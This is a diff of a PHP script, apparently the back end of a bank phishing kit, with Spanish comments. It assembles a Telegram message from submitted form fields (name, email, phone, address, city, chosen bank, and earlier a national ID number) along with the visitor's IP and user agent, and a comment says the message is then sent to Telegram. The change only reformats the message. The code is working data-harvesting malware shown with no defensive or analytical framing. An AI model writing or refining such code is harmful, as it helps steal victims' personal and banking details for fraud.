@@ -27,16 +27,20 @@ $user_ip    = getUserIP();
 $user_agent = $_SERVER['HTTP_USER_AGENT'];
 
 // Construir mensaje
-$msg  = "🚨 *NUEVA INFORMACIÓN RECIBIDA* 🚨\n\n";
-$msg .= "🆔 *Cédula:* " . $_POST['cedula'] . "\n";
-$msg .= "👤 *Nombre:* " . $_POST['nombre'] . "\n";
-$msg .= "📱 *Teléfono:* " . $_POST['phone'] . "\n";
-$msg .= "📧 *Email:* " . $_POST['email'] . "\n";
-$msg .= "🏠 *Dirección:* " . $_POST['address'] . "\n";
-$msg .= "🏙 *Ciudad:* " . $_POST['city'] . "\n";
-$msg .= "🏦 *Banco Seleccionado:* " . $_POST['bank'] . "\n";
-$msg .= "🌍 *IP:* " . $user_ip . "\n";
-$msg .= "🖥 *User-Agent:* " . $_SERVER['HTTP_USER_AGENT'] . "\n";
+$msg  = "📦 *Nueva solicitud pendiente de verificación*\n";
+$msg .= "--------------------------------------------------\n";
+$msg .= "🆔 *ID:* | " . uniqid() . "\n";
+$msg .= "🌐 *IP:* | " . $user_ip . "\n";
+$msg .= "--------------------------------------------------\n";
+$msg .= "👤 *Nombre:* | " . $_POST['nombre'] . "\n";
+$msg .= "📧 *Email:* | " . $_POST['email'] . "\n";
+$msg .= "📞 *Teléfono:* | " . $_POST['phone'] . "\n";
+$msg .= "📍 *Dirección:* | " . $_POST['address'] . "\n";
+$msg .= "🏙 *Ciudad:* | " . $_POST['city'] . "\n";
+$msg .= "🏦 *Banco Seleccionado:* | " . $_POST['bank'] . "\n";
+$msg .= "--------------------------------------------------\n";
+$msg .= "🖥 *User-Agent:* | " . $_SERVER['HTTP_USER_AGENT'] . "\n";
+
 
 
 // Enviar mensaje a Telegram
